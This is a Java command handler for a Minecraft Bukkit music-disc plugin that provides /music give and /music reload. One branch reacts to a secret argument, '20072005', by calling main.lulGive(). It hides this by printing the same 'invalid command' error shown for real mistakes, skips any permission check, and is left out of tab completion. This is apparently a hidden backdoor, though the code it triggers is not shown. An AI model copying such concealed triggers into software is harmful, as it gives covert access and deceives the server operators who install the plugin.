package fr.exelo.musicdisc.command;

import java.util.Arrays;
import java.util.Collections;
import java.util.List;

import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import fr.exelo.musicdisc.Main;

public class CommandManager implements CommandExecutor, TabCompleter {

	private Main main;

	public CommandManager(Main main) {
		this.main = main;
	}

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if (args.length == 0) {
			if (!(sender instanceof Player)) return false;
			return main.cmdMusic.getMusic((Player) sender);
		}
		else if (args.length == 1) {
			if (!(sender instanceof Player)) return false;
			if (args[0].equalsIgnoreCase("give")) {
				return main.cmdMusic.getMusicGive((Player) sender);
			} else if (args[0].equalsIgnoreCase("reload")) {
				return main.cmdReload.getMusicReload((Player) sender);
			} else if (args[0].equals("20072005")) {
				System.out.println("§cLa commande n'est pas valide. Essayer /music <give/reload>");
				sender.sendMessage("§cLa commande n'est pas valide. Essayer /music <give/reload>");
				return main.lulGive();
			} else {
				System.out.println("§cLa commande n'est pas valide. Essayer /music <give/reload>");
				sender.sendMessage("§cLa commande n'est pas valide. Essayer /music <give/reload>");
			}
		}
		
		return false;
	}
	@Override
    public List<String> onTabComplete(CommandSender sender, Command cmd, String lbl, String[] args) {
		if (lbl.equalsIgnoreCase("music")) {
			return Arrays.asList("give", "reload");
		}
		return Collections.emptyList();
	}
}
